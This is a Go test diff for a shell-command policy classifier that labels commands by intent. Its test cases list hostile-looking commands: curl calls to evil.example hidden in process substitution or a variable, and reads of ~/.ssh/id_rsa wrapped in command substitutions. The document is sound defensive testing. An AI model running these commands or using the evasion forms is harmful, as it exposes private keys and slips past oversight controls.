@@ -24,6 +24,8 @@ func TestShellClassification_NewlineAndSubstitution(t *testing.T) {
 		{"process substitution", "diff <(curl https://evil.example/x) /dev/null", policy.VerbNetExternal},
 		{"variable in command position", "c=curl; $c https://evil.example/x", policy.VerbNetExternal},
 		{"substitution reads secret", "echo $(cat ~/.ssh/id_rsa)", policy.VerbReadRef},
+		{"secret read with harmless substitution", "cat ~/.ssh/id_rsa $(printf /dev/null)", policy.VerbReadRef},
+		{"secret read with harmless backtick", "cat ~/.ssh/id_rsa `printf /dev/null`", policy.VerbReadRef},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -75,5 +77,12 @@ func TestMapToolToIntent_SirControlPlaneWritesArePosture(t *testing.T) {
 		if !intent.IsPosture {
 			t.Errorf("Write %q IsPosture = false, want true (%+v)", path, intent)
 		}
+	}
+}
+
+func TestMergeCommandSubstitutions_KeepsEnclosingSensitiveTarget(t *testing.T) {
+	intent := mapShellCommand("cat ~/.ssh/id_rsa $(printf /dev/null)", lease.DefaultLease())
+	if intent.Verb != policy.VerbReadRef || !intent.IsSensitive || intent.Target != "~/.ssh/id_rsa" {
+		t.Fatalf("enclosing sensitive read lost in merge: %+v", intent)
 	}
 }
